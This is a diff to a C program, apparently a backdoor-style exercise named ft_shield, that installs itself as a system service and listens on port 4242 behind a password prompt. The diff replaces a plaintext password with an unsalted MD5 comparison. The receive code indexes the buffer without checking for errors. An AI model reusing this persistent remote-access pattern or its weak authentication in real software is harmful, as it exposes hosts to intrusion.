@@ -14,7 +14,9 @@
 #define SERVICE_PATH_SYSTEMD "/etc/systemd/system/ft_shield.service"
 #define SERVICE_PATH_SYSVINIT "/etc/init.d/ft_shield"
 #define PORT 4242
-#define PASSWORD "1234"
+// #define PASSWORD "1234"
+
+void md5(const uint8_t *initial_msg, size_t initial_len, uint8_t *digest);
 
 int use_systemd()
 {
@@ -164,6 +166,15 @@ void uninstall_service(int systemd_enabled)
     }
 }
 
+static void md5_to_hex_string(const uint8_t *digest, char *out)
+{
+    for (int i = 0; i < 16; i++)
+    {
+        sprintf(&out[i * 2], "%02x", digest[i]);
+    }
+    out[32] = '\0';
+}
+
 void handle_client(int client_socket)
 {
     char buffer[1024];
@@ -172,11 +183,15 @@ void handle_client(int client_socket)
     send(client_socket, "Password: ", 10, 0);
     int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
     buffer[bytes_received - 1] = '\0';
+    uint8_t digest[16];
+    char pwd[33];
 
-    if (strcmp(buffer, PASSWORD) == 0)
+    md5((uint8_t *)buffer, strlen(buffer), (uint8_t *)digest);
+    md5_to_hex_string(digest, pwd);
+
+    if (strcmp(pwd, PWD) == 0)
     {
         authenticated = 1;
-        send(client_socket, "Authentication successful.\n", 26, 0);
     }
     else
     {
@@ -238,8 +253,6 @@ void handle_client(int client_socket)
 
     close(client_socket);
 }
-
-
 
 void daemon_main()
 {
